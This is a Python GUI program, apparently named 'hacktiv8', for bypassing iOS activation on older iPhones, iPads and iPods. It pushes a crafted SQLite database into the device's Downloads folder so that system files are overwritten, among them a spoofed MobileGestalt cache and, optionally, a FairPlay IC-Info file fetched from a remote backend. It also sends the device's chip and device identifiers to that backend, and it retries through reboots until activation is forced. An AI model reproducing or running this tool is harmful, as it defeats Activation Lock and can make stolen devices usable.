import sys
import os
import time
import sqlite3
import tempfile

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget,
    QVBoxLayout, QPushButton, QLabel, QCheckBox, QMessageBox
)
from PyQt5.QtCore import QThread, pyqtSignal, QTimer

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.services.diagnostics import DiagnosticsService


BACKEND_URL = 'http://overcast302.dev/hacktiv8/'

SUPPORTED = {
    'iPhone4,1': {'9.3.5', '9.3.6'},

    'iPad2,1': {'8.4.1', '9.3.5'},
    'iPad2,2': {'9.3.5', '9.3.6'},
    'iPad2,3': {'9.3.5', '9.3.6'},
    'iPad2,4': {'8.4.1', '9.3.5'},

    'iPad2,5': {'8.4.1', '9.3.5'},
    'iPad2,6': {'9.3.5', '9.3.6'},
    'iPad2,7': {'9.3.5', '9.3.6'},

    'iPad3,1': {'8.4.1', '9.3.5'},
    'iPad3,2': {'9.3.5', '9.3.6'},
    'iPad3,3': {'9.3.5', '9.3.6'},

    'iPod5,1': {'8.4.1', '9.3.5'},

    'iPhone5,1': {'10.3.3', '10.3.4'},
    'iPhone5,2': {'10.3.3', '10.3.4'},

    'iPhone5,3': {'10.3.3', '10.3.4'},
    'iPhone5,4': {'10.3.3', '10.3.4'},

    'iPad3,4': {'10.3.3', '10.3.4'},
    'iPad3,5': {'10.3.3', '10.3.4'},
    'iPad3,6': {'10.3.3', '10.3.4'}
}

# pyinstaller resource path fix
def resource_path(name):
    base = getattr(sys, '_MEIPASS', os.path.abspath('.'))
    return os.path.join(base, name)

def build_db_from_sql(sql_path, backend_url, target_path):
    with open(sql_path, 'r', encoding='utf-8') as f:
        sql = f.read()

    sql = sql.replace('BACKEND_URL', backend_url).replace('TARGET_PATH', target_path)

    tmp = tempfile.NamedTemporaryFile(delete=False)
    tmp.close()

    try:
        con = sqlite3.connect(tmp.name)
        con.executescript(sql)
        con.commit()
        con.close()

        with open(tmp.name, 'rb') as f:
            return f.read()
    finally:
        os.unlink(tmp.name)

class ActivationThread(QThread):
    status = pyqtSignal(str)
    success = pyqtSignal(str)
    error = pyqtSignal(str)

    def __init__(self, write_ic_info=False):
        super().__init__()
        self.write_ic_info = write_ic_info

    def wait_for_device(self, timeout=160):
        deadline = time.monotonic() + timeout

        while time.monotonic() < deadline:
            try:
                lockdown = create_using_usbmux()
                DiagnosticsService(lockdown=lockdown).mobilegestalt(
                    keys=['ProductType']
                )
                return lockdown
            except Exception:
                time.sleep(2)

        raise TimeoutError()

    def push_payload(self, lockdown, payload_db):
        with AfcService(lockdown=lockdown) as afc:
            for filename in afc.listdir('Downloads'):
                afc.rm('Downloads/' + filename)
            time.sleep(3)

            afc.set_file_contents(
                'Downloads/downloads.28.sqlitedb',
                payload_db
            )
        DiagnosticsService(lockdown=lockdown).restart()
        return self.wait_for_device()

    def should_hactivate(self, lockdown):
        diag = DiagnosticsService(lockdown=lockdown)
        return diag.mobilegestalt(
            keys=['ShouldHactivate']
        ).get('ShouldHactivate')

    def run(self):
        try:
            lockdown = create_using_usbmux()
            values = lockdown.get_value()

            if values.get('ActivationState') == 'Activated':
                self.success.emit('Device is already activated')
                return

            version_tuple = tuple(int(x) for x in values.get('ProductVersion').split('.'))
            sql_path = resource_path('payload.sql')

            if version_tuple >= (10, 3):
                gestalt_payload = build_db_from_sql(
                    sql_path,
                    BACKEND_URL + 'server.php',
                    '/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist'
                )
            else:
                gestalt_payload = build_db_from_sql(
                    sql_path,
                    BACKEND_URL + 'server.php',
                    '/private/var/mobile/Library/Caches/com.apple.MobileGestalt.plist'
                )

            ic_info_payload = None
            if self.write_ic_info and version_tuple >= (10, 0):
                ucid = values.get('UniqueChipID')
                udid = values.get('UniqueDeviceID')
                ic_url = f'{BACKEND_URL}icinfo.php?ucid={ucid}&udid={udid}'
                ic_info_payload = build_db_from_sql(
                    sql_path,
                    ic_url,
                    '/private/var/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv'
                )

            self.status.emit('Activating device...')

            for attempt in range(5):
                lockdown = self.push_payload(lockdown, gestalt_payload)

                delay = 15 + attempt * 5
                time.sleep(delay)

                if self.should_hactivate(lockdown):
                    if ic_info_payload is not None:
                        self.status.emit('Writing IC-Info...')
                        lockdown = self.push_payload(lockdown, ic_info_payload)
                        time.sleep(10)

                    DiagnosticsService(lockdown=lockdown).restart()
                    self.success.emit('Done!')
                    return

                self.status.emit(f'Retrying activation\nAttempt {attempt + 1}/5')
                time.sleep(5)

            self.error.emit(
                'Activation failed after multiple attempts. Make sure the device is connected to the Wi-Fi.'
            )

        except TimeoutError:
            self.error.emit(
                'Device did not reconnect in time. Please ensure it is connected and try again.'
            )
        except Exception as e:
            self.error.emit(repr(e))


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle('hacktiv8 v1.1.1-testing')
        self.setFixedSize(500, 200)

        self.status = QLabel('No device connected')

        self.ic_info_toggle = QCheckBox('Fix iCloud login')
        self.ic_info_toggle.setChecked(False)
        self.ic_info_toggle.stateChanged.connect(self._on_ic_info_toggled)

        self.activate = QPushButton('Activate Device')
        self.activate.setEnabled(False)

        layout = QVBoxLayout()
        layout.addWidget(self.status)
        layout.addWidget(self.ic_info_toggle)
        layout.addWidget(self.activate)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

        self.activate.clicked.connect(self.start_activation)

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.poll_device)
        self.timer.start(1000)

    def _on_ic_info_toggled(self, state):
        if state:
            QMessageBox.warning(
                self,
                'Fix iCloud Login',
                'Warning: This feature relies on non-free software and exposes unique device information to a third-party server. Proceed with caution.'
            )

    def poll_device(self):
        try:
            lockdown = create_using_usbmux()
            values = lockdown.get_value()

            product = values.get('ProductType')
            version = values.get('ProductVersion')

            is_supported = SUPPORTED.get(product)

            if not is_supported:
                self._set_state(f'Unsupported Device: {product}', False)
                return

            if version not in is_supported:
                self._set_state(f'Unsupported {product} iOS version: {version}', False)
                return

            self._set_state(f'Connected: {product} ({version})', True)

        except Exception:
            self._set_state('No device connected', False)

    def _set_state(self, text, enabled):
        self.status.setText(text)
        self.activate.setEnabled(enabled)

    def start_activation(self):
        QMessageBox.information(
            self,
            'Info',
            'Your device will now be activated. Please ensure it is connected to Wi-Fi.'
        )

        self.timer.stop()
        self.activate.setEnabled(False)

        self.worker = ActivationThread(write_ic_info=self.ic_info_toggle.isChecked())
        self.worker.status.connect(self.status.setText)
        self.worker.success.connect(self.on_success)
        self.worker.error.connect(self.on_error)
        self.worker.start()

    def on_success(self, msg):
        self.status.setText(msg)
        QMessageBox.information(self, 'Success', msg)
        self.activate.setEnabled(True)
        self.timer.start(1000)

    def on_error(self, msg):
        QMessageBox.critical(self, 'Error', msg)
        self.status.setText('Error occurred')
        self.timer.start(1000)


if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())